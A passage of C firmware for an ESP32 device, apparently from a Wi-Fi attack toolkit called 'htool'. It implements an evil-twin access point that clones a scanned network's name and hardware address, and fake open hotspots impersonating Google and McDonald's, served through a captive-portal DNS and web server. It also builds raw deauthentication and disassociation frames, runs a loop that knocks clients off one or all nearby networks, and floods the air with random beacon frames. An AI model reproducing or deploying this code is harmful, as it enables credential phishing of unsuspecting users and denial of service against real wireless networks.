            struct sockaddr_in6 source_addr; // Large enough for both IPv4 or IPv6
            socklen_t socklen = sizeof(source_addr);
            int len = recvfrom(sock, rx_buffer, sizeof(rx_buffer) - 1, 0, (struct sockaddr *)&source_addr, &socklen);

            // Error occurred during receiving
            if (len < 0) {
                ESP_LOGE(TAG, "recvfrom failed: errno %d", errno);
                if (cp_running == false) {
                    goto exit;
                }
                close(sock);
                break;
            }
            else {
                // Get the sender's ip address as string
                if (source_addr.sin6_family == PF_INET) {
                    inet_ntoa_r(((sockaddr_in_t *)&source_addr)->sin_addr.s_addr, addr_str, sizeof(addr_str) - 1);
                }
                else if (source_addr.sin6_family == PF_INET6) {
                    inet6_ntoa_r(source_addr.sin6_addr, addr_str, sizeof(addr_str) - 1);
                }

                rx_buffer[len] = 0;

                char reply[DNS_MAX_LEN];
                int reply_len = parse_dns_request(rx_buffer, len, reply, DNS_MAX_LEN);

                ESP_LOGI(TAG, "Received %d bytes from %s | DNS reply with len: %d", len, addr_str, reply_len);
                if (reply_len <= 0) {
                    ESP_LOGE(TAG, "Failed to prepare a DNS reply");
                }
                else {
                    int err = sendto(sock, reply, reply_len, 0, (struct sockaddr *)&source_addr, sizeof(source_addr));
                    if (err < 0) {
                        ESP_LOGE(TAG, "Error occurred during sending: errno %d", errno);
                        break;
                    }
                }
            }
        }
    }
    exit:
    shutdown(sock, 0);
    close(sock);
    vTaskDelete(NULL);
}

void htool_wifi_dns_start() {
    ESP_LOGI(TAG, "Starting DNS server ...");
    xTaskCreatePinnedToCore(dns_server_task, "dns_task", 4096, NULL, 5, NULL, 0);
}

void htool_wifi_start_httpd_server_task() {
    ESP_LOGI(TAG, "Starting HTTP server ...");
    xTaskCreatePinnedToCore(httpd_server_task, "http_server", 4096, NULL, 5, NULL, 0);
}

void wifi_event_handler(void* arg, esp_event_base_t event_base,
                        int32_t event_id, void* event_data) {
    if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_AP_STACONNECTED) {
        target_connected = true;
    }
    else if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_AP_STADISCONNECTED) {
        target_connected = false;
    }
}

void htool_wifi_captive_portal_start(void *pvParameters) {
    esp_event_handler_instance_register(WIFI_EVENT, ESP_EVENT_ANY_ID, &wifi_event_handler, NULL, NULL);
    esp_wifi_stop();
    wifi_config_t wifi_config = {0};
    if (captive_portal_task_args.is_evil_twin) {
        ESP_LOGD(TAG, "Starting evil twin ...");
        memcpy(wifi_config.ap.ssid, global_scans[captive_portal_task_args.ssid_index].ssid, sizeof(global_scans[captive_portal_task_args.ssid_index].ssid));
        wifi_config.ap.ssid_len = strlen((char *)wifi_config.ap.ssid);
        wifi_config.ap.channel = global_scans[captive_portal_task_args.ssid_index].primary;
        wifi_config.ap.authmode = WIFI_AUTH_OPEN;
        wifi_config.ap.max_connection = 4;
        esp_base_mac_addr_set(global_scans[captive_portal_task_args.ssid_index].bssid);
    }
    else {
        if (captive_portal_task_args.cp_index == 0) {
            ESP_LOGI(TAG, "Starting google captive portal ...");
            strcpy((char *)wifi_config.ap.ssid, "Google Free WiFi Test");
            wifi_config.ap.ssid_len = strlen((char *)wifi_config.ap.ssid);
            wifi_config.ap.channel = 0;
            wifi_config.ap.authmode = WIFI_AUTH_OPEN;
            wifi_config.ap.max_connection = 4;
        }
        else {
            ESP_LOGI(TAG, "Starting mcdonnalds captive portal ...");
            strcpy((char *)wifi_config.ap.ssid, "McDonald's Free WiFi");
            wifi_config.ap.ssid_len = strlen((char *)wifi_config.ap.ssid);
            wifi_config.ap.channel = 0;
            wifi_config.ap.authmode = WIFI_AUTH_OPEN;
            wifi_config.ap.max_connection = 4;
        }
   }
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
    ESP_ERROR_CHECK(esp_wifi_set_config(ESP_IF_WIFI_AP, &wifi_config));
    target_connected = false;
    cp_running = true;
    esp_wifi_start();
    htool_wifi_dns_start();
    htool_wifi_start_httpd_server_task();
}

void htool_wifi_captive_portal_stop(void *pvParameters) {
    httpd_unregister_uri_handler(server, "/*", 1);
    httpd_stop(server);
    cp_running = false; //closes the dns server
    shutdown(sock, 0);
    close(sock);
    target_connected = false;
    htool_set_wifi_sta_config(); //change back to sta mode to make sure we can perform scans again
}

// barebones packet
uint8_t beacon_packet[56] = { 0x80, 0x00, 0x00, 0x00, //Frame Control, Duration
        /*4*/   0xff, 0xff, 0xff, 0xff, 0xff, 0xff, //Destination address
        /*10*/  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, //Source address - overwritten later
        /*16*/  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, //BSSID - overwritten to the same as the source address
        /*22*/  0xc0, 0x6c, //Seq-ctl
        /*24*/  0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, //timestamp - the number of microseconds the AP has been active
        /*32*/  0x64, 0x00, //Beacon interval
        /*34*/  0x01, 0x04, //Capability info
        /* SSID */
        /*36*/  0x00
};

static uint8_t deauth_packet[26] = {
        0xc0, 0x00, 0x3a, 0x01, 0xff, 0xff,
        0xff, 0xff, 0xff, 0xff,0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00,
        0xf0, 0xff, 0x02, 0x00
};

char beacon_random[] = "1234567890qwertzuiopasdfghjklyxcvbnm QWERTZUIOPASDFGHJKLYXCVBNM_";

void send_random_beacon_frame() { //TODO: maybe add some predefined beacon frames to make it looks more funny
    channel = esp_random() % 13 + 1;
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

    // Randomize SRC MAC
    beacon_packet[10] = beacon_packet[16] = esp_random() % 256;
    beacon_packet[11] = beacon_packet[17] = esp_random() % 256;
    beacon_packet[12] = beacon_packet[18] = esp_random() % 256;
    beacon_packet[13] = beacon_packet[19] = esp_random() % 256;
    beacon_packet[14] = beacon_packet[20] = esp_random() % 256;
    beacon_packet[15] = beacon_packet[21] = esp_random() % 256;
    beacon_packet[37] = 6;

    // Randomize SSID (Fixed size 6. Lazy right?)
    beacon_packet[38] = beacon_random[esp_random() % 65];
    beacon_packet[39] = beacon_random[esp_random() % 65];
    beacon_packet[40] = beacon_random[esp_random() % 65];
    beacon_packet[41] = beacon_random[esp_random() % 65];
    beacon_packet[42] = beacon_random[esp_random() % 65];
    beacon_packet[43] = beacon_random[esp_random() % 65];

    beacon_packet[56] = channel;

    uint8_t postSSID[13] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, //supported rate
                            0x03, 0x01, 0x04 /*DSSS (Current Channel)*/ };


    for (uint8_t i = 0; i < 12; i++)
        beacon_packet[38 + 6 + i] = postSSID[i];

    esp_wifi_80211_tx(WIFI_IF_STA, beacon_packet, sizeof(beacon_packet), false);
    esp_wifi_80211_tx(WIFI_IF_STA, beacon_packet, sizeof(beacon_packet), false);
    esp_wifi_80211_tx(WIFI_IF_STA, beacon_packet, sizeof(beacon_packet), false);
}


void beacon_spammer() {
    while (htool_api_is_beacon_spammer_running()) {
        send_random_beacon_frame();
        ESP_LOGI(TAG, "Beacon sent");
        vTaskDelay(pdMS_TO_TICKS(10));
    }
    ESP_LOGI(TAG, "Beacon Spammer Task stopped");
    vTaskDelete(NULL);
}

void htool_wifi_start_beacon_spammer() {
    if (perform_passive_scan || perform_active_scan) {
        ESP_LOGI(TAG, "Scan in progress, stop the scan");
        scan_manually_stopped = true;
        esp_wifi_scan_stop();
    }
    xTaskCreatePinnedToCore(beacon_spammer, "beacon_spammer", 4096, NULL, 1, NULL, 0);
}

void htool_wifi_send_disassociate_frame(uint8_t num, bool sta) {
    if (esp_wifi_set_channel(global_scans[num].primary, global_scans[num].second) != ESP_OK) {
        ESP_LOGI(TAG, "TARGET is connectiong");
        target_connected = true;
    }

    deauth_packet[10] = deauth_packet[16] = global_scans[num].bssid[0];
    deauth_packet[11] = deauth_packet[17] = global_scans[num].bssid[1];
    deauth_packet[12] = deauth_packet[18] = global_scans[num].bssid[2];
    deauth_packet[13] = deauth_packet[19] = global_scans[num].bssid[3];
    deauth_packet[14] = deauth_packet[20] = global_scans[num].bssid[4];
    deauth_packet[15] = deauth_packet[21] = global_scans[num].bssid[5];

    deauth_packet[4] = esp_random() % 256;
    deauth_packet[5] = esp_random() % 256;
    deauth_packet[6] = esp_random() % 256;
    deauth_packet[7] = esp_random() % 256;
    deauth_packet[8] = esp_random() % 256;
    deauth_packet[9] = esp_random() % 256;

    deauth_packet[0] = 0xA0; // Deauth

    if (!sta) {
        esp_wifi_80211_tx(WIFI_IF_AP, deauth_packet, sizeof(deauth_packet), false);
        esp_wifi_80211_tx(WIFI_IF_AP, deauth_packet, sizeof(deauth_packet), false);
        esp_wifi_80211_tx(WIFI_IF_AP, deauth_packet, sizeof(deauth_packet), false);
        ESP_LOGI(TAG, "Disassociate frame sent: %s %d %d %d", global_scans[num].ssid, global_scans[num].primary,
                 global_scans[num].second, num);
    }
    else {
        esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
        esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
        esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
        ESP_LOGI(TAG, "Disassociate frame sent: %s %d %d %d", global_scans[num].ssid, global_scans[num].primary,
                 global_scans[num].second, num);

    }
}

void htool_wifi_send_deauth_frame(uint8_t num, bool sta) {
    if (esp_wifi_set_channel(global_scans[num].primary, global_scans[num].second) != ESP_OK) {
        ESP_LOGI(TAG, "TARGET is connectiong");
        target_connected = true;
    }

    deauth_packet[10] = deauth_packet[16] = global_scans[num].bssid[0];
    deauth_packet[11] = deauth_packet[17] = global_scans[num].bssid[1];
    deauth_packet[12] = deauth_packet[18] = global_scans[num].bssid[2];
    deauth_packet[13] = deauth_packet[19] = global_scans[num].bssid[3];
    deauth_packet[14] = deauth_packet[20] = global_scans[num].bssid[4];
    deauth_packet[15] = deauth_packet[21] = global_scans[num].bssid[5];

    deauth_packet[4] = esp_random() % 256;
    deauth_packet[5] = esp_random() % 256;
    deauth_packet[6] = esp_random() % 256;
    deauth_packet[7] = esp_random() % 256;
    deauth_packet[8] = esp_random() % 256;
    deauth_packet[9] = esp_random() % 256;

    deauth_packet[0] = 0xC0; // Deauth

    if (!sta) {
        esp_wifi_80211_tx(WIFI_IF_AP, deauth_packet, sizeof(deauth_packet), false);
        esp_wifi_80211_tx(WIFI_IF_AP, deauth_packet, sizeof(deauth_packet), false);
        esp_wifi_80211_tx(WIFI_IF_AP, deauth_packet, sizeof(deauth_packet), false);
        ESP_LOGI(TAG, "Deauth sent: %s %d %d %d", global_scans[num].ssid, global_scans[num].primary, global_scans[num].second, num);
    }
    else {
        esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
        esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
        esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
        ESP_LOGI(TAG, "Deauth sent: %s %d %d %d", global_scans[num].ssid, global_scans[num].primary, global_scans[num].second, num);
    }
}

void htool_send_deauth_all() {
    for (uint8_t i = 0; i < global_scans_count; i++) {
        htool_wifi_send_deauth_frame(i, true);
    }
}

void deauther_task() {
    while (htool_api_is_deauther_running()) {
        if (menu_cnt != global_scans_count) {
            htool_wifi_send_deauth_frame(menu_cnt, true);
        }
        else {
            htool_send_deauth_all();
        }
        vTaskDelay(pdMS_TO_TICKS(10));
    }
    ESP_LOGI(TAG, "Deauther Task stopped");
    vTaskDelete(NULL);
}

void htool_wifi_start_deauth() {
    if (perform_passive_scan || perform_active_scan) {
        ESP_LOGI(TAG, "Scan in progress, stop the scan");
        scan_manually_stopped = true;
        esp_wifi_scan_stop();
    }
    xTaskCreatePinnedToCore(deauther_task, "deauth", 4096, NULL, 1, NULL, 0);
}

void htool_wifi_start_active_scan() {
    perform_active_scan = true;
}

void htool_wifi_start_passive_scan() {
    perform_passive_scan = true;
}

static void wifi_handling_task(void *pvParameters) {
    wifi_scan_config_t scan_conf;
    EventBits_t uxBits;
    if ((global_scans = calloc(32, sizeof(wifi_ap_record_t))) == NULL) {
        ESP_LOGE(TAG, "Error no more free Memory");
        vTaskDelete(NULL);
    }
    if ((wifi_config = calloc(1, sizeof(wifi_config_t))) == NULL) {
        ESP_LOGE(TAG, "Error no more free Memory");
        vTaskDelete(NULL);
    }
    while (true) {
        while (perform_active_scan) {
            scan_conf.scan_type = WIFI_SCAN_TYPE_ACTIVE;
            scan_conf.show_hidden = true;
            scan_conf.scan_time.active.min = 50;
            scan_conf.scan_time.active.max = 100;
            if (esp_wifi_scan_start(&scan_conf, false) != ESP_OK) {
                ESP_LOGE(TAG, "Error at wifi_scan_start probably not in station mode change to station mode");
                htool_set_wifi_sta_config();
            }
            xEventGroupClearBits(wifi_client->status_bits, WIFI_SCAN_FINISHED_BIT);
            uxBits = xEventGroupWaitBits(wifi_client->status_bits, WIFI_SCAN_FINISHED_BIT, pdTRUE, pdFALSE,
                                         pdMS_TO_TICKS(1500));
            if ((uxBits & WIFI_SCAN_FINISHED_BIT) != 0) {
                ESP_LOGI(TAG, "Scan finished");
                if (scan_manually_stopped) {
                    scan_manually_stopped = false;
                    perform_active_scan = false;
                    scan_started = false;
                    ESP_LOGI(TAG, "Scan manually stopped");
                    break;
                }
                esp_wifi_scan_get_ap_records(&global_scans_num, global_scans);
                global_scans_count = global_scans_num;
                global_scans_num = 32;
                ESP_LOGI(TAG, "Scan count: %d", global_scans_count);
                perform_active_scan = false;
                scan_started = false;
            }
            else {
                perform_active_scan = false;
                ESP_LOGE(TAG, "Scan timeout");
            }
        }
        while (perform_passive_scan) {
            scan_conf.scan_type = WIFI_SCAN_TYPE_PASSIVE;
            scan_conf.show_hidden = true;
            scan_conf.scan_time.passive = 520;
            if (esp_wifi_scan_start(&scan_conf, false) != ESP_OK) {
                ESP_LOGE(TAG, "Error at wifi_scan_start probably not in station mode change to station mode");
                htool_set_wifi_sta_config();
            }
            xEventGroupClearBits(wifi_client->status_bits, WIFI_SCAN_FINISHED_BIT);
            uxBits = xEventGroupWaitBits(wifi_client->status_bits, WIFI_SCAN_FINISHED_BIT, pdTRUE, pdFALSE,
                                         pdMS_TO_TICKS(8000));
            if ((uxBits & WIFI_SCAN_FINISHED_BIT) != 0) {
                ESP_LOGI(TAG, "Scan finished");
                if (scan_manually_stopped) {
                    scan_manually_stopped = false;
                    perform_passive_scan = false;
                    scan_started = false;
                    ESP_LOGI(TAG, "Scan manually stopped");
                    break;
                }
                esp_wifi_scan_get_ap_records(&global_scans_num, global_scans);
                global_scans_count = global_scans_num;
                global_scans_num = 32;
                ESP_LOGI(TAG, "Scan count: %d", global_scans_count);
                perform_passive_scan = false;
                scan_started = false;
            }
            else {
                perform_passive_scan = false;
                ESP_LOGE(TAG, "Scan timeout");
            }
        }
        vTaskDelay(pdMS_TO_TICKS(100));
    }
}

static void event_handler(void *arg, esp_event_base_t event_base, int32_t event_id, void *event_data) {
    if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_START) {
        ESP_LOGI(TAG, "WIFI_EVENT_STA_START");
        wifi_client->wifi_station_active = true;
    }
    else if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_STOP) {
        ESP_LOGI(TAG, "WIFI_EVENT_STA_STOP");
        wifi_client->wifi_station_active = false;
    }
    else if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_SCAN_DONE) {
        ESP_LOGI(TAG, "WIFI_EVENT_SCAN_DONE");
        xEventGroupSetBits(wifi_client->status_bits, WIFI_SCAN_FINISHED_BIT);
    }
    else if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_DISCONNECTED) {
        ESP_LOGI(TAG, "WIFI_EVENT_STA_DISCONNECTED");
        wifi_event_sta_disconnected_t *dr = event_data;
        wifi_err_reason_t reason = dr->reason;
        ESP_LOGW(TAG, "Disconnected. Reason: %d", reason);
        if (reason != WIFI_REASON_ASSOC_LEAVE) {
            wifi_client->wifi_connected = false;
        }
    }
    else if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_CONNECTED) {
        ESP_LOGI(TAG, "WIFI_EVENT_STA_CONNECTED");
        wifi_client->wifi_connected = true;
        xEventGroupSetBits(wifi_client->status_bits, WIFI_CONNECTED);
    }
    else if (event_base == IP_EVENT && event_id == IP_EVENT_STA_GOT_IP) {
        ESP_LOGI(TAG, "IP_EVENT_STA_GOT_IP");
        ip_event_got_ip_t *event = (ip_event_got_ip_t *)event_data;
        ESP_LOGI(TAG, "got ip:%s", ip4addr_ntoa((const ip4_addr_t *)&event->ip_info.ip));
    }
}

void htool_set_wifi_sta_config() {
    esp_wifi_stop();
    wifi_config_t config = {0};
    config.sta.scan_method = WIFI_ALL_CHANNEL_SCAN;
    config.sta.sort_method = WIFI_CONNECT_AP_BY_SIGNAL;
    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_set_config(ESP_IF_WIFI_STA, &config);
    esp_wifi_start();
}


void htool_wifi_start() {
    if (esp_wifi_start() != ESP_OK) {
		ESP_LOGE(TAG, "Error during esp_wifi_start()!");
		esp_restart();
	}
   xTaskCreatePinnedToCore(wifi_handling_task, "wifi_handling_task", 4096,
                          NULL, 6, &htask, PRO_CPU_NUM);
}

int htool_wifi_init() {
    wifi_client = calloc(1, sizeof(htool_wifi_client_t));
    if (wifi_client == NULL) {
        ESP_LOGE(TAG, "Error no Memory");
        return HTOOL_ERR_MEMORY;
    }
    wifi_client->status_bits = xEventGroupCreate();
    esp_err_t err = nvs_flash_init();
    if (err == ESP_ERR_NVS_NO_FREE_PAGES || err == ESP_ERR_NVS_NEW_VERSION_FOUND)
    {
        ESP_ERROR_CHECK(nvs_flash_erase());
        err = nvs_flash_init();
    }
    ESP_ERROR_CHECK(err);

    ESP_ERROR_CHECK(esp_netif_init());

    esp_netif_t *ap_netif = esp_netif_create_default_wifi_ap();
    assert(ap_netif);

    esp_netif_ip_info_t ip_info;

    IP4_ADDR(&ip_info.ip, 124, 213, 16, 29); // for smartphones use public ip
    IP4_ADDR(&ip_info.gw, 124, 213, 16, 29);
    IP4_ADDR(&ip_info.netmask, 255, 0, 0, 0);
    esp_netif_dhcps_stop(ap_netif);
    esp_netif_set_ip_info(ap_netif, &ip_info);
    esp_netif_dhcps_start(ap_netif);
    esp_netif_set_hostname(ap_netif, CONFIG_LWIP_LOCAL_HOSTNAME);

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
    esp_wifi_set_mode(WIFI_MODE_STA);

    esp_wifi_set_channel(0, WIFI_SECOND_CHAN_NONE);

    ESP_ERROR_CHECK(esp_wifi_set_ps(WIFI_PS_NONE));

    esp_wifi_set_promiscuous(true);

    esp_wifi_set_max_tx_power(82);

   wifi_country_t ccconf = {
            .cc = "00", // worldwide setting
            .schan = 1,
            .nchan = 13,
            .policy = WIFI_COUNTRY_POLICY_MANUAL
    };

    if (esp_wifi_set_country(&ccconf) != ESP_OK) {
        ESP_LOGE(TAG, "Error during setup of wifi country code!");
    }

    ESP_ERROR_CHECK(esp_event_handler_register(WIFI_EVENT, ESP_EVENT_ANY_ID, &event_handler, NULL));

    return HTOOL_OK;
}